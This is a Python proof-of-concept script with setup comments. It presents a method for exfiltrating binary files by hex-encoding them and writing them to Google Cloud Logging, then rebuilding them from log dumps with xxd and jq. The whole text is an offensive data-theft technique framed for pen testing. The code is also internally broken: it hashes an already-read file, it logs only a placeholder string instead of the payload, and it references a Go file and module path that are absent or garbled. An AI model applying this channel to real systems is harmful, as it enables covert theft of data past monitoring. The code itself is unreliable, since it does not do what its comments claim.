# Proof of concept data exfil binary files to cloud logging via hex string
# Dennis Chow dchow[AT]xtecsystems.com March 26, 2023
# No expressed warranty or liability.
# Dependencies: mkdir py-dataexfil-logging && python3 -m venv . && source ./bin/activate && pip install google-cloud-logging
# Usage: Modify your variables and then run python3 py-dataexfil-logging.py 
# Note: In pen testing do a go build first go build -o gologexfil ./main.go ensure you have already go get cloud.goog.e.com/logging
# Retrieve your file in GCP Cloud Logging either by console and dump to file e.g. cat dump.txt | xxd -r -p > somefile.ext
# Alternatively use jq e.g. jq -r '.[] | {textPayload} | select(.textPayload != null) | .textPayload'  ./downloaded-logs.json > payload-hexdump.text

#!/usr/bin/env python3
import binascii, hashlib
from google.cloud import logging


#read file in and hash in 4K chunks SHA256
sha256_hash = hashlib.sha256()
with open('dog-image.jpeg', 'rb') as input_file:
  payload_hex = binascii.hexlify(input_file.read())
  payload_count = len(str(payload_hex))
  for byte_block in iter(lambda: input_file.read(4096),b""):
      sha256_hash.update(byte_block)
      #print(sha256_hash.hexdigest())
  hash_value = str(sha256_hash.hexdigest())

print("Char count: " +str(payload_count))
print("SHA256: " + hash_value)

#gcp cloud logging client
logging_client = logging.Client()
logger = logging_client.logger("foobar-logname")
logger.log_text("foobar-test")